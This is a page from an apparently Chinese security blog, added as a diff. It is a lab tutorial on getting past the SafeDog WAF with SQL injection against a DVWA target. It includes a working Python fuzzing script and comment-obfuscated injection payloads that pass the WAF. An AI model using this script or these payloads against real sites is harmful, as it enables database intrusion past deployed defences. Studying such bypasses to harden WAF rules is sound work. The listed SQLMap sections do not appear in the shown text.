@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Tr0e"><meta name="copyright" content="Tr0e"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>Python攻防-Fuzz绕过安全狗进行SQL注入 | Cyber Security</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tr0e.github.io","root":"/","title":["Tr0e","Blog"],"version":"1.10.4","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","fireworks":{"colors":null},"vendors":{"darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Cyber Security" type="application/atom+xml"><meta name="description" content="前言在渗透测试过程中，经常会遇到很多 Web 站点部署了 WAF，这个时候使用常规的 Payload 进行 XSS、SQL 注入的检测避免不了被 WAF 拦截阻断的命运。 Fuzz 模糊测试是一种有效的检测 WAF 过滤规则缺陷并尝试进行 WAF 绕过的技术，本文将以“PhpStudy+DVWA+ 安全狗v4.0”的实验环境演示 Fuzz 测试绕过 WAF。 WAF部署我在先前的博文：渗透测试-浅">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python攻防-Fuzz绕过安全狗进行SQL注入">
+<meta property="og:url" content="https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Cyber Security">
+<meta property="og:description" content="前言在渗透测试过程中，经常会遇到很多 Web 站点部署了 WAF，这个时候使用常规的 Payload 进行 XSS、SQL 注入的检测避免不了被 WAF 拦截阻断的命运。 Fuzz 模糊测试是一种有效的检测 WAF 过滤规则缺陷并尝试进行 WAF 绕过的技术，本文将以“PhpStudy+DVWA+ 安全狗v4.0”的实验环境演示 Fuzz 测试绕过 WAF。 WAF部署我在先前的博文：渗透测试-浅">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418221038304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418223622493.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418230736393.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418231330758.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823153129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224915896.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224951181.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418233249800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418233223170.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823423270.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418234651877.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210418234628879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419000730422.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001108395.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001342868.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419002754321.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419003054987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041900570913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419005811216.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012029463.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419012102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012155190.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419012334776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419012441696.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/202104190126441.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419012731155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419014323218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210419014708555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-04-18T17:47:56.000Z">
+<meta property="article:modified_time" content="2022-06-15T16:17:24.632Z">
+<meta property="article:author" content="Tr0e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210418221038304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Tr0e"><img width="96" loading="lazy" src="/images/Tr0e.jpg" alt="Tr0e"></a><div class="site-author-name"><a href="/about/">Tr0e</a></div><span class="site-name">Cyber Security</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/about/" title="About Me" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WAF%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">WAF部署</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%AE%80%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">WAF简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97"><span class="toc-number">2.2.</span> <span class="toc-text">网站安全狗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fuzz%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">Fuzz脚本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzz%E8%84%9A%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">Fuzz脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%95%88%E6%9E%9C"><span class="toc-number">3.2.</span> <span class="toc-text">脚本效果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">SQLMap绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzz%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">4.1.</span> <span class="toc-text">Fuzz关键词</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tamper%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">tamper绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tr0e.github.io/Python%E6%94%BB%E9%98%B2-Fuzz%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Tr0e"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Cyber Security"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Python攻防-Fuzz绕过安全狗进行SQL注入</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2021-04-19 01:47:56" itemprop="dateCreated datePublished" datetime="2021-04-19T01:47:56+08:00">2021-04-19</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web安全</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透测试过程中，经常会遇到很多 Web 站点部署了 WAF，这个时候使用常规的 Payload 进行 XSS、SQL 注入的检测避免不了被 WAF 拦截阻断的命运。<br><img src="https://img-blog.csdnimg.cn/20210418221038304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<p>Fuzz 模糊测试是一种有效的检测 WAF 过滤规则缺陷并尝试进行 WAF 绕过的技术，本文将以“PhpStudy+DVWA+ 安全狗v4.0”的实验环境演示 Fuzz 测试绕过 WAF。</p>
+<h1 id="WAF部署"><a href="#WAF部署" class="headerlink" title="WAF部署"></a>WAF部署</h1><p>我在先前的博文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/103583673">渗透测试-浅析WAF绕过</a> 中简述过 WAF 的绕过技术，读者可参考阅读。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418223622493.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="WAF简述"><a href="#WAF简述" class="headerlink" title="WAF简述"></a>WAF简述</h2><p>先来回顾下 WAF 的基础常识。</p>
+<p><strong>目前主流的WAF产品</strong><br>| WAF类型      | 主流产品                                     |<br>| ———— | ——————————————– |<br>| 云WAF        | 阿里云盾、腾讯网站管家、创宇盾、ClodeFlare等 |<br>| 软件产品类   | 安全狗、云锁、360主机卫士、ModSecurity       |<br>| 硬件类型设备 | 启明星辰、绿盟、天融信、飞塔等               |</p>
+<p><strong>WAF为什么会被绕过:</strong></p>
+<ol>
+<li>鱼（安全）和熊掌（业务性能）不能兼得，WAF 需要满足基本业务需求，所以一般不设置白名单之类的过于苛刻的操作；</li>
+<li>WAF 为了考虑通用性的问题，无法 100% 覆盖某些语言、中间件、数据库等特性；</li>
+<li>硬件 WAF 自身往往存在漏洞（硬件 WAF 对 HTTP 协议的兼容性不强，对异常报文会产生 bug，导致绕过）；</li>
+<li>WAF 的过滤、防范规则缺陷（如正则匹配绕过）。</li>
+</ol>
+<h2 id="网站安全狗"><a href="#网站安全狗" class="headerlink" title="网站安全狗"></a>网站安全狗</h2><p>网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马/木马扫描、防 SQL 注入、防盗链、防 CC 攻击、网站流量实时监控、网站 CPU 监控、下载线程保护、IP 黑白名单管理、网页防篡改功能等模块。安全狗能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p>
+<p><strong>DVWA靶场搭建</strong></p>
+<p>为了演示安全狗 WAF 的防护作用和对其进行绕过，需要先搭建 DVWA 靶场。 本人在 Win7 虚拟机使用 phpstudy 集成环境（<a target="_blank" rel="noopener" href="https://www.xp.cn/">下载地址</a>）直接部署 DVWA 靶场（<a target="_blank" rel="noopener" href="http://www.dvwa.co.uk/">官网下载地址</a>），具体部署过程此处忽略（百度一搜一大把），部署后如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418230736393.png" alt="在这里插入图片描述" loading="lazy">此时暂未部署 WAF，在 Low 安全级别下对 SQL 注入进行测试，可成功注入代码：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418231330758.png" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823153129.png" alt="在这里插入图片描述" loading="lazy">具体的注入测试和完整的获取数据库账户密码的过程，读者可参见先前另一篇博文的记录：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86698770">Web安全-SQL注入漏洞</a>，此处不再展开。</p>
+<p><strong>网站安全狗部署</strong></p>
+<p>1、如下是 <a target="_blank" rel="noopener" href="https://www.safedog.cn/">安全狗的官网</a>，可下载免费版的网站安全狗：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224915896.png" alt="在这里插入图片描述" loading="lazy">2、选择最新的 Apache 版 v4.0 并下载：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418224951181.png" alt="在这里插入图片描述" loading="lazy">3、下载完一键安装即可，但需要注意的一点是，安装安全狗插件时，需要知道 Apache 服务名，新版的 phpstudy 是无法直接查看的，将导致安全狗安装程序找不到对应的 Apache 服务名：<br><img src="https://img-blog.csdnimg.cn/20210418233249800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<p>4、此时需要先关闭 phpstudy 的 Apache 服务，并进入 phpstudy 的 Apache 安装目录的 bin 文件夹下打开 CMD，输入下面命令：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">httpd.exe -k <span class="token function">install</span> -n apache2.4</code></pre>
+<p>5、接着重新安装安全狗即可成功安装，如下图所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418233223170.png" alt="在这里插入图片描述" loading="lazy"><br>6、可以查看下安全狗默认开启的 HTTP 安全检测规则：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2021041823423270.png" alt="在这里插入图片描述" loading="lazy"><br>7、开启安全狗对 DVWA 靶场站点进行安全防护后，再次进行 SQL 注入测试（简单的<code>1&#39; and &#39;1&#39;=&#39;1</code>)则立马会被拦截：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210418234651877.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p>拦截页面如下：<br><img src="https://img-blog.csdnimg.cn/20210418234628879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<h1 id="Fuzz脚本绕过"><a href="#Fuzz脚本绕过" class="headerlink" title="Fuzz脚本绕过"></a>Fuzz脚本绕过</h1><p>下面就来演示通过 Python 脚本进行 Fuzz 测试，如何成功找到有效的 Payload 绕过安全狗。</p>
+<h2 id="Fuzz脚本"><a href="#Fuzz脚本" class="headerlink" title="Fuzz脚本"></a>Fuzz脚本</h2><p>先上最终的 Fuzz 脚本 <code>sqlfuzz.py</code>：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
+<span class="token comment">#python3过狗脚本，自行验证</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+ 
+fuzz_zs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/*'</span><span class="token punctuation">,</span><span class="token string">'*/'</span><span class="token punctuation">,</span><span class="token string">'/*!'</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'!'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">]</span>
+fuzz_sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>
+fuzz_ch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"%09"</span><span class="token punctuation">,</span><span class="token string">"%0a"</span><span class="token punctuation">,</span><span class="token string">"%0b"</span><span class="token punctuation">,</span><span class="token string">"%0c"</span><span class="token punctuation">,</span><span class="token string">"%0d"</span><span class="token punctuation">,</span><span class="token string">"%20"</span><span class="token punctuation">,</span><span class="token string">"%a0"</span><span class="token punctuation">]</span>
+
+fuzz <span class="token operator">=</span> fuzz_zs<span class="token operator">+</span>fuzz_ch<span class="token operator">+</span>fuzz_sz
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"</span><span class="token punctuation">,</span>
+    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"security=low; PHPSESSID=jga8ilgk0h7h36sps6jvr71pub"</span>
+<span class="token punctuation">&#125;</span>
+url_start <span class="token operator">=</span> <span class="token string">"http://192.168.88.119/DVWA/vulnerabilities/sqli/?id=1"</span>
+<span class="token comment">#需要测试的Payload总数量 </span>
+<span class="token builtin">len</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">3</span>
+num <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token comment">#三层嵌套组合，也可增加为4、5、6层……</span>
+<span class="token keyword">for</span> a <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> b <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> c <span class="token keyword">in</span> fuzz<span class="token punctuation">:</span>
+            num <span class="token operator">+=</span> <span class="token number">1</span>
+            <span class="token comment">#payload = "'/*!union"+a+b+c+"select*/1,2#"</span>
+            <span class="token comment">#payload = "'/**//*!*/AND/*!*/"+a+b+c+"/**/order/**/by/**/1--+"</span>
+            <span class="token comment">#成功绕过安全狗</span>
+            payload <span class="token operator">=</span> <span class="token string">"'/**//*!*/and/*!*/"</span><span class="token operator">+</span>a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token operator">+</span><span class="token string">"/**/'1'='1"</span>
+            url <span class="token operator">=</span> url_start <span class="token operator">+</span> payload<span class="token operator">+</span><span class="token string">"&amp;Submit=Submit#"</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token operator">*</span><span class="token number">30</span> <span class="token operator">+</span><span class="token string">'\r'</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now URL:"</span><span class="token operator">+</span>url<span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"完成进度:%s/%s \r"</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"First name: admin"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[0;33m[*]Find BypassWAF Payload:\033[0m"</span><span class="token operator">+</span>url<span class="token punctuation">)</span>         
+                <span class="token keyword">with</span> <span class="token builtin">open</span> <span class="token punctuation">(</span><span class="token string">"Results.txt"</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> r<span class="token punctuation">:</span>
+                    r<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>                </code></pre>
+<p>以上代码注意几点：</p>
+<ol>
+<li>以上判定 Payload 是否有效的条件是搜索响应包中是否包含”<code>First name: admin</code>“，原因是 Payload 无效的话要么是安全狗拦截页面，要么是 SQL 注入语法报错页面，均不会成功回显数据库查询结果；</li>
+<li>Fuzz 字典是依据 Mysql 数据库的一些特性组合生成的有可能产生绕过 WAF 的字符；</li>
+<li>注意请求头中的 Cookie 在此处是必备的字段！不添加 Cookie 的话直接发送 request 请求只会显示未登录并集中跳转到登陆页面。要获取有效的登录后的 Cookie 可通过 BurpSuite 抓包读取：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419000730422.png" alt="在这里插入图片描述" loading="lazy"></li>
+</ol>
+<h2 id="脚本效果"><a href="#脚本效果" class="headerlink" title="脚本效果"></a>脚本效果</h2><p>来看看脚本执行的效果：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001108395.png" alt="在这里插入图片描述" loading="lazy">可以看到，已经成功找到诸多可以绕过安全狗的 Payload（将脚本执行结束的话找到上百成千种 Payload 不是梦……），打开脚本存放的目录下自动生成的 <code>result.txt</code> 文件查看具体的 Payload：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419001342868.png" alt="在这里插入图片描述" loading="lazy">随便拿一个 Payload （第一个：<code>1&#39;/**//*!*/and/*!*//*/**//**/&#39;1&#39;=&#39;1</code>）试试：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210419002754321.png" alt="在这里插入图片描述" loading="lazy"><br>改为<code>1&#39;/**//*!*/and/*!*//*/**//**/&#39;1&#39;=&#39;2</code>则无返回值：<br><img src="https://img-blog.csdnimg.cn/20210419003054987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>至此，已成功绕过安全狗对于 <code>1’ and &#39;1&#39;=&#39;1</code> 的测试 Payload 的拦截，成功借助以上变形的 Payload 判定该处存在 SQL 注入！</p>
